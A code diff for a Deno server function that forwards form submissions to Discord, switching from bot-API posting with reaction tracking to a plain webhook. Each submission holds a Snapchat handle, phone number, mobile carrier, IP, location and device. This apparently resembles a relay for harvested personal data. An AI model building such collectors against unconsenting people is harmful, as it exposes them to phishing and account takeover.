@@ -1,7 +1,6 @@
 import { createClientFromRequest } from 'npm:@base44/sdk@0.8.31';
 
-const DISCORD_BOT_TOKEN = Deno.env.get("DISCORD_BOT_TOKEN");
-const DISCORD_CHANNEL_ID = Deno.env.get("DISCORD_CHANNEL_ID");
+const DISCORD_WEBHOOK = Deno.env.get("DISCORD_WEBHOOK");
 
 Deno.serve(async (req) => {
   const authHeader = req.headers.get("authorization") || "";
@@ -16,6 +15,7 @@ Deno.serve(async (req) => {
   const { snapchat, telephone, operateur, submissionId, ip, country, city, browser, device } = body;
 
   const formatPhone = (tel) => tel.replace(/(\d{2})(?=\d)/g, '$1 ').trim();
+  const formatPhoneRaw = (tel) => tel.replace(/\D/g, '').slice(-10);
 
   // Use all data from body parameters
   const finalIp = ip || "Inconnue";
@@ -73,53 +73,11 @@ Deno.serve(async (req) => {
     timestamp: now.toISOString(),
   };
 
-  // Send message using Discord Bot API
-  let messageId = null;
-  try {
-    const msgRes = await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages`, {
-      method: "POST",
-      headers: {
-        "Authorization": `Bot ${DISCORD_BOT_TOKEN}`,
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        content: "@everyone",
-        embeds: [embed]
-      })
-    });
-
-    if (msgRes.ok) {
-      const msgData = await msgRes.json();
-      messageId = msgData.id;
-
-      // Add reactions to the message
-      const reactions = ['✅', '❌', '⏳', '🚫'];
-      for (const reaction of reactions) {
-        await fetch(`https://discord.com/api/v10/channels/${DISCORD_CHANNEL_ID}/messages/${messageId}/reactions/${encodeURIComponent(reaction)}/@me`, {
-          method: "PUT",
-          headers: {
-            "Authorization": `Bot ${DISCORD_BOT_TOKEN}`
-          }
-        });
-      }
-    } else {
-      const error = await msgRes.text();
-      console.error(`Discord API error ${msgRes.status}: ${error}`);
-      return Response.json({ error: "Failed to send Discord message" }, { status: 500 });
-    }
-  } catch (e) {
-    console.error("Discord message error:", e.message);
-    return Response.json({ error: e.message }, { status: 500 });
-  }
-
-  // Store submission with messageId for reaction tracking
-  try {
-    await base44.asServiceRole.entities.Submission.update(submissionId, {
-      discord_message_id: messageId
-    });
-  } catch (e) {
-    console.error("Update submission error:", e.message);
-  }
+  await fetch(DISCORD_WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ content: "@everyone", embeds: [embed] }),
+  });
 
   await base44.asServiceRole.entities.ActionLog.create({
     submission_id: submissionId,
@@ -128,5 +86,5 @@ Deno.serve(async (req) => {
     timestamp: now.toISOString()
   });
 
-  return Response.json({ ok: true, messageId });
+  return Response.json({ ok: true });
 });
